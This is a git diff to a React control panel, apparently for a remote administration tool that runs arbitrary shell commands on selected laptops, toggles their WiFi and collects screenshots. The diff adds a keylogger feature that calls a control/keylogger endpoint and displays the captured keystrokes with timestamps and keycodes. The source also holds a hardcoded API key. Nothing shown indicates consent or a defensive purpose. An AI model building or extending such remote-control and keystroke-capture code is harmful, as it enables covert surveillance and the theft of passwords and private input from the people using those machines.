@@ -7,11 +7,15 @@ function App() {
   const [selectedLaptop, setSelectedLaptop] = useState(null);
   const [isLoading, setIsLoading] = useState(false);
   const [command, setCommand] = useState('echo "Hello World"');
+  const [timer, setTimer] = useState("2m");
   const [output, setOutput] = useState("");
   const [status, setStatus] = useState("");
 
+  const [keylogDuration, setKeylogDuration] = useState(5000); // ms
+  const [keylogData, setKeylogData] = useState([]);
+
   const API_URL = import.meta.env.VITE_API_URL || `http://localhost:3001/api/`;
-  const API_KEY = "Pawan_Bisht"; // In prod, use environment variables
+  const API_KEY = "Pawan_Bisht"; // In prod, use env var
 
   const wifiOff = "wifi-off";
   const wifiOn = "wifi-on";
@@ -64,13 +68,14 @@ function App() {
     }
 
     setIsLoading(true);
-    setOutput(""); // Clear previous output
+    setOutput("");
     try {
       const response = await axios.post(
         `${API_URL}control/execute`,
         {
           laptopId: selectedLaptop.id,
           command: command,
+          timer: timer,
         },
         { headers: { "X-API-Key": API_KEY } },
       );
@@ -84,21 +89,48 @@ function App() {
     }
   };
 
-  // Function to determine if output contains a file path
-  const hasFilePath = (outputData) => {
-    return (
-      outputData &&
-      typeof outputData === "object" &&
-      (outputData.filePath || outputData.filepath)
-    );
+  const startKeylogger = async () => {
+    if (!selectedLaptop) {
+      setStatus("Please select a laptop first");
+      return;
+    }
+
+    setIsLoading(true);
+    setKeylogData([]);
+    setStatus("Starting keylogger...");
+
+    try {
+      const response = await axios.post(
+        `${API_URL}control/keylogger`,
+        {
+          laptopId: selectedLaptop.id,
+          duration: keylogDuration,
+        },
+        { headers: { "X-API-Key": API_KEY } },
+      );
+
+      if (response.data.success && Array.isArray(response.data.keys)) {
+        setKeylogData(response.data.keys);
+        setStatus(`Keylogger ran for ${keylogDuration}ms`);
+      } else {
+        setStatus("No key data received.");
+      }
+    } catch (error) {
+      console.error("Error running keylogger:", error);
+      setStatus("Keylogger failed.");
+    } finally {
+      setIsLoading(false);
+    }
   };
 
-  // Function to get correct file path
-  const getFilePath = (outputData) => {
-    return outputData.filePath || outputData.filepath;
-  };
+  const hasFilePath = (outputData) =>
+    outputData &&
+    typeof outputData === "object" &&
+    (outputData.filePath || outputData.filepath);
 
-  // Function to get file name from path
+  const getFilePath = (outputData) =>
+    outputData.filePath || outputData.filepath;
+
   const getFileName = (path) => {
     if (!path) return "download";
     return path.split("screenshots/").pop() || "download";
@@ -153,15 +185,23 @@ function App() {
 
             <div className="control-card">
               <h3>Network Controls</h3>
-
               <div className="button-group">
-                <button
-                  onClick={() => turnOffWifi(wifiOff)}
-                  className="danger"
-                  disabled={isLoading}
-                >
-                  Disable WiFi
-                </button>
+                <div className="command-input-container">
+                  <input
+                    value={timer}
+                    onChange={(e) => setTimer(e.target.value)}
+                    disabled={isLoading}
+                    placeholder="timer...."
+                    className="command-input"
+                  />
+                  <button
+                    onClick={() => turnOffWifi(wifiOff)}
+                    className="danger"
+                    disabled={isLoading}
+                  >
+                    Disable WiFi
+                  </button>
+                </div>
 
                 <button
                   onClick={() => turnOffWifi(wifiOn)}
@@ -171,8 +211,6 @@ function App() {
                   Enable WiFi
                 </button>
               </div>
-
-              {status && <p className="status">{status}</p>}
             </div>
 
             <div className="control-card">
@@ -226,6 +264,44 @@ function App() {
                 )}
               </div>
             </div>
+
+            <div className="control-card">
+              <h3>Keylogger</h3>
+              <div className="command-input-container">
+                <input
+                  type="number"
+                  min="1000"
+                  step="1000"
+                  value={keylogDuration}
+                  onChange={(e) => setKeylogDuration(parseInt(e.target.value))}
+                  disabled={isLoading}
+                  placeholder="Duration in ms"
+                  className="command-input"
+                />
+                <button
+                  onClick={startKeylogger}
+                  disabled={isLoading}
+                  className="danger"
+                >
+                  {isLoading ? "Logging..." : "Start Keylogger"}
+                </button>
+              </div>
+
+              {keylogData.length > 0 && (
+                <div className="output-container">
+                  <h4>Keylogger Output:</h4>
+                  <ul className="text-output">
+                    {keylogData.map((entry, idx) => (
+                      <li key={idx}>
+                        {entry.timestamp} — {entry.key} ({entry.keycode})
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+              )}
+            </div>
+
+            {status && <p className="status">{status}</p>}
           </div>
         )}
       </div>
